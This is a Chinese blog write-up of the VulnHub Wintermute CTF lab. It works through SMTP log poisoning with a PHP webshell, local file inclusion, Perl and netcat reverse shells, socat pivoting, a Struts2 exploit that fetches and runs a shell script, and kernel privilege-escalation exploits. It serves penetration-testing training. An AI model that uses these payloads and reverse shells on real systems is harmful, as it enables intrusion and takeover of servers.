> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/JEDkv5cKBTxYGM8sAPpuqg)

大余安全  

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **24** 篇文章，本公众号会每日分享攻防渗透技术给大家。

![](https://mmbiz.qpic.cn/mmbiz_png/gBSJuVtWXPZE73MPxL1VoDjO3DFaxJA2MQpSSibwsXKVf4VIHh8S9fZXT8pq1ALE3hWEN22AaniaghxGrJqjEsxw/640?wx_fmt=png)

靶机地址：https://www.vulnhub.com/entry/wintermute-1,239/

靶机难度：中级（CTF）

靶机发布日期：2018 年 7 月 5 日

靶机描述：一个新的 OSCP 风格实验室，涉及 2 台易受攻击的机器，以赛博朋克经典 Neuromancer 为主题 - 任何网络安全爱好者都必须阅读。该实验室利用了数据透视和后期开发，而我发现其他 OSCP 预处理实验室似乎缺乏。目标是在两台计算机上都扎根。您只需要默认的 Kali Linux。

不会出现缓冲区溢出或漏洞利用的情况 - 使用小的单词列表就可以完成任何必要的密码破解。

Straylight - 模拟带有 2 个 NICS 的面向公众的服务器。首先盖上此盖，然后转到最后一台机器。Neuromancer - 在具有 1 个 NIC 的非公共网络中。您的 Kali 框应仅与 Straylight 位于同一虚拟网络上。（谷歌翻译英文！）

目标：得到 root 权限 & 找到 flag.txt

请注意：对于所有这些计算机，我已经使用 VMware 运行下载的计算机。我将使用 Kali Linux 作为解决该 CTF 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_png/ymNhlIRQRwIDdqQDCiblECK9VN2KquqTzJXM7etEnDcIpDdITqzFuiapav9TDnIiaGgf1e4sP9IO6B5NEtEyg2t5w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/eGDabDaNAhQ72wHWRToOUZR31X9kamiak0wrpr3lxKHpuoTpia329Xu6T0OTYlZic9XeEyQ4twasnibb924VBgIt1g/640?wx_fmt=png)

一、信息收集

这是两台设备，是不是很期待！

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukqzFiaNMiacSGPoZHc6ACxC2MbQQSicUHzNgXEv4xAwtvEYqXfaKfnV5LrQ/640?wx_fmt=png)

我们在 VM 中需要确定攻击目标的 IP 地址，需要使用 nmap 获取目标 IP 地址：后面更换了网卡！

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukqAbJRP5ic7oMtC0l5BEsTAjn5OkicYvKaykZNfTc2zZrZ4e0CfcU39obQ/640?wx_fmt=png)我们已经找到了此次 CTF 目标计算机 IP 地址：

```
Straylight：192.168.56.113（服务器）
```

介绍说一台与我的 kali 机器位于同一网络上，另一台位于与第一个目标链接的独立网络上，意思是通过渗透 Straylight 获得权限后，在跳跃到 PC 端 Neuromancer 上获得权限...Straylight 就是一个跳板，通俗点就是你黑进了电信机房的服务器后，通过服务器黑进了用户的 PC 端！！

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukql3gsufriaTZwCYBicrrSO6O8TstbJl9NjPf7y44yibqfOjp4f47naMZZw/640?wx_fmt=png)

开了 25、80、3000 端口，先来看看 80....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukqGUzHONAicwqfTj8nro9lR2TkhcaWib1fgdU7lWpox6k7T1Lz2W1z3NSw/640?wx_fmt=png)

刚截完图... 随意点下就进入了这个界面....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukqw7z9mqcxGxA8UTwoHqahRVa4w9MP4xkNyB3j2MsrczUbzT7Hv4Skvw/640?wx_fmt=png)

就是两个人的对话... 让我去渗透它.... 这边没找到啥有用的，用个新工具 gobuster（域名目录爆破）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukq60FESBWUbMepia83EwfMtdZibYDRYDmw9yTzy0BjXjQThpiaaiaR8CLiaaA/640?wx_fmt=png)

```
gobuster -u http://192.168.56.113 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php，txt
```

用 gobuster 通过 medium 目录文本去爆破服务器  

/manual 和 / freeside 目录，进去看看...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukqUFT6I6Rbj7Ewvt9A94Aibchg3kic0VqqD3jpgiaM0mOlF9lUpefOrCxJQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukqibiaJsRvv82wmQNa1wBtgvmxtcbdEMUeaAcQFZ6ewVvDM1sd3Dhf8p4Q/640?wx_fmt=png)

反正我看了半天，没发现有引导我能去干嘛的地方...（特别是第一个眼睛疼...）

先不管 80 了... 看看 3000 端口也是 http 开放的...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukqsdspPU4tWp6jOvOLRwibniaJJOz5OQ05icMV9gxFMtkMiaMCwDx1DUelYg/640?wx_fmt=png)

最后一行的提示，直接 admin 用户默认密码成功登录![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukqbEHXuHaHpynOjqJNCpCLDgUN5O6c1neF1mLoBVZwzVPPBOAZqh6S3Q/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukqgCjymxcY1eiaknvOlI2tmfibEc2V8PzUIRyoR1mic2jGM8Kqc4Yo9QUxg/640?wx_fmt=png)

这里看到了 80 端口上存在的目录情况.../freeside 目录已经前面就发现了，没啥信息... 登录 / turing-bolo / 目录试试...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukqlotLkPAicKbROQGriaKluDgJFv5AuibGBBbJN9vf2SytIdRDhzrAIvHNQ/640?wx_fmt=png)

往下滑还有信息...（这里是坑了我几分钟时间，做得太逼真我都忘了往下滑）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukqaiaX2hGxibhjeL81WEnhJibJpsA4Xia1ze8EibZqI83z644cbdvFknBNhGw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukq0habjVIH9GZ7PaQ7hX0iarCN0Agib6VjoJ8rJTs86z3R2PyrWtLCMk3g/640?wx_fmt=png)

我按提交后...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukqJXZ89E8z0sxbwIGPiaJRicePsnicPEEj5AVYv4RCTnoX8vTYHPYqKxoMA/640?wx_fmt=png)

将我重定向到了 / turing-bolo/bolo.php?bolo=case 链接下... 还发现 bolo 参数的本地文件包含 LFI 漏洞（bolo.php）

```
molly.log
armitage.log
riviera.log
```

页面中还包含这三个日志文件... 查看下三个日志文件...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukqiaMjBqPVXN4tOriaM77NNP7pxsuZCCguKx8xr90PsQfwDm8xCqQNxOzA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukqpFkiav4OCiaRMickuXTyiaNN3gzrwBUCzt8MIzYycnFdf2ibZFKnaNGcwDw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukqYguPdUUu0MSMaGkWl3YrOpia9mOuZ4cX5kCNX3YUKcUz0P32P1s1vDA/640?wx_fmt=png)

没啥有用的信息... 通过页面存在日志文件，测试看看 case.log 是否存在...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukqdBNYtloosrHCib6iadKBpW4h7r2LCofse4J491A6jZhHB2GpF5L2l4PQ/640?wx_fmt=png)

更加证实了 LFI 漏洞的存在...

二、提权

我尝试目录遍历漏洞... 尝试了../ 等等没啥用... 还在考虑如何将 php 注入到服务器中...

这边谷歌查看了下 postfix log location（日志后缀链接的位置）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukqIgCc8piaLollPRLd3s0zibj9iaJN1ic33wrHh7iarFdDyf3sCz2sIWs9yEQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukqPdgD80B14gawpB8CpF6sh71cx6qxAJNl8obgerHmLYibnsqJwnyyfrQ/640?wx_fmt=png)

嘿嘿... 如果能将 PHP 的 shell 代码写入日志就完美了... 继续

前面 nmap 扫描开启了 25 的 postfix smtp 服务器...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukqAPfSmBoj8aAtIOUCkxdQLVU1ict6DlvJrcO2fiaFIPTuqElLM3EPqrZQ/640?wx_fmt=png)

```
1）HELO hackerman
2）MAIL FROM: "hackerman <?php echo shell_exec($_GET['cmd']);?>"
3）RCPT TO:root
4）DATA
```

通过 nc 进入到服务器的 smtp 上，然后通过命令注入 PHP...（结果很完美）

这里可以用反向 shell 来获权...

这边要对 url Encoding 有些理解就行...[链接](https://blog.csdn.net/langurisser/article/details/49160903)

这边用到了 perl 的 socket 编程...（perl 可以写 shell 我也是浏览过帖子看到的这代码，尝试后还真可以用...）

```
perl -e 'use Socket;$i="192.168.56.103";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

将上面代码随便复制黏贴在浏览器打开就能生成链接后缀了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukqa1cqS0Miavl31uUUNgaQYlTzicuoSKA6LIicSPrLw6HJqrxzNky2KN7SA/640?wx_fmt=png)

生成后：

```
perl+-e+'use+Socket%3B%24i%3D"192.168.30.128"%3B%24p%3D1234%3Bsocket(S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname("tcp"))%3Bif(connect(S%2Csockaddr_in(%24p%2Cinet_aton(%24i)))){open(STDIN%2C">%26S")%3Bopen(STDOUT%2C">%26S")%3Bopen(STDERR%2C">%26S")%3Bexec("%2Fbin%2Fbash+-i")%3B}%3B'&ie=utf-8&oe=utf-8&client=firefox-b-ab
```

然后复制放到 bolo 链接里的 cmd = 后即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukqPzjGdb4JshNsCvBCticsJB4nVCSw8sANSp4Q38LtwHM7wtE8HVczVug/640?wx_fmt=png)

看不太懂编码后面的同学，前面一定要看得懂哦... 这是注入了一个 perl 写的 shell，对本地 1234 端口打开...nc 打开下 1234..

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukqHOGXnGIuNJ0s7zgKfGwWXnqkpEm4wOyxleql0ggHZaOA3TOV8ToyuA/640?wx_fmt=png)

反向外壳成功提权...（鼓励学习更多的新方法）

这边我在介绍另外一个方法， 我也成功了的...（主要上面的方法很多新知识， 就写出来了）

方法：  

```
1）发现目录遍历后直接利用../../../../等去测试...（这边通过mail后缀知道可以smtp上传）
2）然后通过nc或者telnet上去后，用RCPT TO发送命令...（随意一个python的php即可）
3）发送完页面下面会提示www-data等信息，说明可以反向shell
4）然后用msfvenom生成shell，通过smtp上传shell.elf即可
5）最后通过Meterpreter进行内核提权即可  （这是最笨的方法也是最省事的方法，但是目前还是想学多点东西...没记录这个，可以多看以前章节，然后就会了）
```

三、特权提升

需要发现 SUID...

可以通过 find、linenum（需要上传这个脚本到服务上）来枚举所有具有 SUID 权限的二进制文件...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukqmxonwPR8bVpQyxb6t78K61pMW2EIg72uS0cIA77zHpDplEkzFpgYibQ/640?wx_fmt=png)

```
find / -perm -4000 2>/dev/null
```

这里发现了版本号，在谷歌中寻找下，找到了 https://www.exploit-db.com/exploits/ 41154  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukqic9Sq0TBV2faOBonJOjhibCdsGDe3NwwdnGE4w37AFgayvzYPxezsnAA/640?wx_fmt=png)

或者直接在 kali 中针对搜即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukqC1TIslTdNuz2wAXszAaw4VYrHQbicicywKRn45mnKWnWkB66e4GeEOeA/640?wx_fmt=png)

这边我们来熟悉下 41154 代码...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukqj9NG8ScDiaibCvruDfjNGpcNxbCbiauKNyVBWPEr07aLYjicEs1gHaU6yg/640?wx_fmt=png)

让我们创建两个 c 文件... 然后使用他给的代码 gcc 编译即可提权... 那来做吧...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukqBKx7uXNoSKcOOSUTNx3GKI1HU1fo0oB3kFQofZruHchFNUXk2LiaxVQ/640?wx_fmt=png)

弄完了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukq8OGFkNOA9iaVLR5b29QA3X8TIThUsMzibB9MhpWhNwAGOfCp9cD8lH8g/640?wx_fmt=png)

开启本地 HTTP 服务后...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukqxcFm72qsBBiaSWfmcXbPM6vjFMN7yFCfAfMEwRKBYuYlU0EMouEibmhA/640?wx_fmt=png)

继续...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukql7LRWqHnKgkicQJDCmMNKibrOaVJK14xTAeCY7MdIERBRm7X16ibg8IpA/640?wx_fmt=png)

这些命令是在 41154 编码中会教... 然后继续

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukqgOPMicQJxPzwFFvJmJ9VeVKBibdXicNSg2x0cDiaLRWJ3den9GEmcuLFOQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukqSU1Yf6xK33s0SOia22bbt8bCq5PPTBafOoj4qkL7jHHKlkygraHib8xg/640?wx_fmt=png)

命令：

```
1）cd /etc
2）umask 000
3）screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
4）screen -ls（这里一定要出现[+] done!才会成功...我都发狂了）
5）/tmp/rootshell
```

受不了了，本来运行 exp 几分钟就好了... 我硬是用了 2 小时，因为两 c 文件我开始是在本地就 gcc 编译的，然后上传编译好的到靶机，哪晓得一直报错！！！，我检查了很多原因，第一次是因为用 gedit 复制黏贴会导致. c 文件被破坏才报错...（浪费 30 分钟）... 第二次是因为本地 gcc 编译后上传到靶机就有问题了...（耽误 40 分钟）... 第三次是直接用 vi 在本地复制黏贴好两个 C 文件后，直接上传到靶机在用 gcc 语言编译，然后才成功的...（这里我差点都怀疑是不是我靶机下错了... 哭了.. 耐心... 加油）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukqAWvwwqSVYRssS88zNUtxPOxSiciaAjWe8QzKQp06ZtQp6oVtmW9ctiblw/640?wx_fmt=png)

好了，成功获得 root 权限...

```
flag：5ed185fd75a8d6a7056c96a436c6d8aa
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukqHbia1AJPwU1f3ZV1v8U54mHibLjdQV8U50DlvuSFnKEMT5Qr8subL6iaw/640?wx_fmt=png)

上面的意思是：提供了一个 URL:/struts2_2.3.15.1-showcase 但这不适用于本机的 IP，由于服务器是通过 tomcat 运行的，因此必须找出一种无需 nmap（nmap 未安装在服务器上）进行端口扫描的方法，还需要找到另一端使用的 IP 地址...neuromancer 正在其上运行的 IP，目前只能使用简单的 bash 命令了...

四、另一次攻击：Neuromancer

这里重新调整了 VB 虚拟机的网卡，添加了两张网卡...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukqxHDbicB3y9cX4ibGEUWnsehiaVXn6yicOYgaVEre3rj9nbFzmLKznw0A7w/640?wx_fmt=png)

没下载画图软件... 简单看看...straylight 作为中间人...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukqvakVJfJQxndY5fuDSbuBLoic85JQe8VX3yUwLVDvezkHwYEE0ypHN9g/640?wx_fmt=png)

这边看出 straylight 是双宿主机... 另外一个链接 Neur 的是 192.168.49.3...

发现 IP，这边直接用命令：

```
for ip in $(seq 1 254); do ping -c 1 192.168.56.$ip; done
for i in $(seq 1 255); do ping -c 1 192.168.49.$i; done | grep "bytes from"
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukq6RrNRXa6icg8vq3J7RRUf7uR1s3ouYJaBLiciaHP0Wm9xs2Sr5pHHSf3g/640?wx_fmt=png)

目标计算机 IP 地址：

```
192.168.49.4
```

下面就直接找开放了那些端口...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukq76tyq2Tgib035LJ59RS4VXcJBbVXABkoh0HE6lCXMiaHPWjxl4iaGUEPg/640?wx_fmt=png)

```
for i in $(seq 1 65535); do nc -nvz -w 1 192.168.49.4 $i 2>&1; done | grep -v "Connection refused"
```

8009、8080、34483 端口... 需要将它们通过隧道传输到与我相同的网络上

这边如果不在同一网段，需要检查下 socat 是否可用

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukq2jbr9kSU8W1TtQAx07EeicIq9EE1Hu1ZsibFuGppdGq2tgkxzkSH4NVQ/640?wx_fmt=png)

这边需要进行端口转发，kali 才可以去访问

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukq8EsvTsl6wvAG3lAzAfbNfnUicc3sFdBOZicFYvouWk75cDJG4QXIafGA/640?wx_fmt=png)

```
1）socat TCP-LISTEN:8009,fork,reuseaddr TCP:192.168.49.4:8009 &
2）socat TCP-LISTEN:8080,fork,reuseaddr TCP:192.168.49.4:8080 &
3）socat TCP-LISTEN:34483,fork,reuseaddr TCP:192.168.49.4:34483 &
```

“＆” 号只是标准的. nix 语法，用于运行命令并将其放到后台，以便您可以继续使用其他内容....

这样我们就能在外部网络查看到他们三个端口的服务了... 这样我就可以用 nmap 进行扫描了... 看看

这里还可以用 netstat -plunt 也能看出...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukqmkWg5WG5jyvIpBViaPqQfYQdOMPyBRbJgrTpjiaNH4gibXCgnVkaH6icXw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukqxHSdBeAP7JhDgmLIjH0WUEmhq2Dsw2mcXdxEA0LibX7X5YaL1VTxdbg/640?wx_fmt=png)

图上可以看到已经成功链接... 尝试通过 3 个端口中的任何一个与 Straylight（通过公共子网：192.168.49.3 ）联系，则通信将直接转发到 Neuromancer 上运行的相同端口

浏览器打开他们...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukqtZvAIK9pc4bEtDvCOnvqJ1szpNG4GQNGnHS0ibcKicibCmyZNBbC0QPLA/640?wx_fmt=png)

进来后发现信息量太大了，现在已经凌晨 3 点了... 就不管了，直接按照前面 root-note 发现的链接指示走...

进入发现 / struts2_2.3.15.1-showcase 上的 tomcat 部署了一些东西，所以去看看 http://192.168.56.114:8080/struts2_2.3.15.1-showcase

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukq9IzKiaMwHa6YO5YJ6jiba5Cq6QfHOewSYwmDUbpHOsXEx1Ro6JlGz3NQ/640?wx_fmt=png)

页面可以看到 Struts2 Showcase 欢迎的页面...(存在 Apache Struts 输入验证错误漏洞）

直接谷歌搜索 struts2 showcase exploit 漏洞

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukq71pkW4Lf0UwqgefHyadcGMJTIM5n9Vlx3VhMPWaFJItgibWaOSkoQuQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukq6adSaDxRIH2icTnystDBt1JVmj9KArpxqsORuWZhicj72icx2N20rdSUA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukquX9YkoG0Kxqe3FlaRjcV7hP3G7Vsu4SscrdBicQLzAX11FwCq83m8qA/640?wx_fmt=png)

要使 shell 能够通过外壳回调，需要以其他方式转发端口....

理解：需要将反向 shell 从 Neuromancer 中返回到 kali 中，其中 Straylight 是 ** 中间人 ** 来执行端口转发任务，因为 kali 和 Neuromancer 无法直接交谈... 所以需要 socat 再次使用...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukqNvtVESgNZkRoib6EBOZP0pyQicQNOYptYYKmZAGjGXJcEFJXRXHvEecQ/640?wx_fmt=png)

```
socat TCP-LISTEN:6666,fork,reuseaddr TCP:192.168.56.103:6666 &
```

我们可以看到 Straylight 正在侦听 TCP 端口 6666 上的流量了.....

在 kali 上通过 nc 开启监听...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukqPtOT0ZOKqoM5sYvPicohiaygUaicVJdubQJDk2hmjCIgu8muDF0VeXL8w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukqIWjqWlxGibsIlrqmuDodRwT5vHCVXEJdkBRBAibibOHibY1BpDwatWgRew/640?wx_fmt=png)

```
python 42324.py http://192.168.56.123:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action "nc -nv 192.168.49.3 6666"
```

此靶机 netcat 版本不支持 nc -e 功能..... 所以管道和重定向之类的特定于 shell 的命令可能无法正常工作....

这边需要用另外一种方法.... 可以执行 wget 将反向 shell 直接拉向 Neuromancer.... 可以在 4321/tcp 的 kali 上设置一个侦听的 Python SimpleHTTPServer 的服务.... 由于端口转发，任何 wget 在 Neuromancer 上对 Straylight 执行的请求 4321/tcp 都可以找到 kali 本机....

先开启 4321 端口转发....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukqT0HEaONOmxIe2nr03qDETa7ByOHQZsDf3xWQOZfR1DK1S3KpnEMaBw/640?wx_fmt=png)

启动 Python Web 服务器....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukqHVjLNxO2hbgEGSNNucu6wU2YHwmjR9slc9w1skickelbWjLorOsRSJw/640?wx_fmt=png)

如果渗透对方最好使用 pentestmonkey 提供的反向 shell（安全起见哈...）

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.3 6666 >/tmp/f
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukqsqFjia1x7sWicicLEMZic4gPGXstJtuJmLSEKgNXpq9DYDyXGF1ugVwwNQ/640?wx_fmt=png)

使用 wget 发送反向 shell 到对方去...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukq6iaMB88RHibJiaAKf2jyPF70Z01neezMLx9f8SphicKJb5NzhrtHMO7Kiag/640?wx_fmt=png)

```
python 42324.py http://192.168.56.123:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action "wget http://192.168.49.3:4321/dayu1.sh -O /tmp/dayu1.sh"
```

（模仿 exp 给我脚本命令即可）  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukqbxutmhXF5lpjSAfmKicGXrFoMVKtFMLmicQ05Kjnj2PKpL6YglLk05kA/640?wx_fmt=png)

```
python 42324.py http://192.168.56.123:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action "chmod +x /tmp/dayu1.sh"
```

发送 chmod 让它可执行...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukqrT5agUJ4S64UsibmOaXkib9t0wwsqUj7YZcFQQOZ1I7bEIolGRv7L4FA/640?wx_fmt=png)

```
python 42324.py http://192.168.56.123:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action "sh /tmp/dayu1.sh"
```

成功进入对方服务器.... 嘿嘿！！！（这里发现 stra... 换了 IP，因为凌晨 3 点还没做出来，困死关机睡觉了）

go

go

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukqsEsM56MbGgdNq2XZjJWhGe8CsML7Yd0rENTmT5u8vwvrhNcaI6p5XA/640?wx_fmt=png)

可以看到没装 python... 搜索 Linux  4.4.0 exploit

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukqxtZInUfpbCrKZ7lIJDOxyLNHGmf0eJE1ic76Rja2mt3CYib65iagN9QAQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukqWWSDFAibhcNJoQXcIesapmKTEDFibia06ib0iaibJOf2S2fRObX0aWBVOmUw/640?wx_fmt=png)

发现 44298 可以利用...（试了 su 提权，不允许...)

先 cp 把 44298 拿出来 gcc 编译即可

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukqKGunia3XOWlJebN5G9SZMyUfqPueeAbULt9adG6XXiaLr05ia7kxP49qw/640?wx_fmt=png)

然后上传到 Neuromancer 上

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukqmO6tBdEABlGQDXV7kLSvwvXibhn7RVWOgInbtcZaLQiaQ5jibbkXnBAAQ/640?wx_fmt=png)

执行即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYAPtuDztF30TCBfIBQukqsib2rRyf7Ln12FYUG1RldrmktG1rISryD2Rvw8FUARib8doicMw8PVLjg/640?wx_fmt=png)

```
flag：be3306f431dae5ebc93eebb291f4914a
```

![](https://mmbiz.qpic.cn/mmbiz_png/gBSJuVtWXPZE73MPxL1VoDjO3DFaxJA2MQpSSibwsXKVf4VIHh8S9fZXT8pq1ALE3hWEN22AaniaghxGrJqjEsxw/640?wx_fmt=png)

这里有个小坑，如果是 32 位的 kali 系统用 gcc 编译 44298.c 会报错，因为里面代码含有_u64 写的编码... 必须得 64 位系统用 gcc 编译，当然还有别的方法...

成功提权...

总而言之，学到很多...Neuromancer 是一台非常有趣的靶机，为了达到目的，必须先进入另一个靶机 Straylight，然后学习如何正确使用 socat 进行旋转（这里很坑的，一定要动手操作下），一旦我在 Neuromancer 上获得低特权 shell，特权映射就非常简单了…… 至少对于内核利用途径而言，肯定还有别的提权方法在 Neuromancer，等我后期有精力了肯定会来发掘下！！！

由于我们已经成功得到 root 权限 & 找到 flag.txt，因此完成了简单靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

![](https://mmbiz.qpic.cn/mmbiz_png/ymNhlIRQRwIDdqQDCiblECK9VN2KquqTzJXM7etEnDcIpDdITqzFuiapav9TDnIiaGgf1e4sP9IO6B5NEtEyg2t5w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/eGDabDaNAhQ72wHWRToOUZR31X9kamiak0wrpr3lxKHpuoTpia329Xu6T0OTYlZic9XeEyQ4twasnibb924VBgIt1g/640?wx_fmt=png)

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

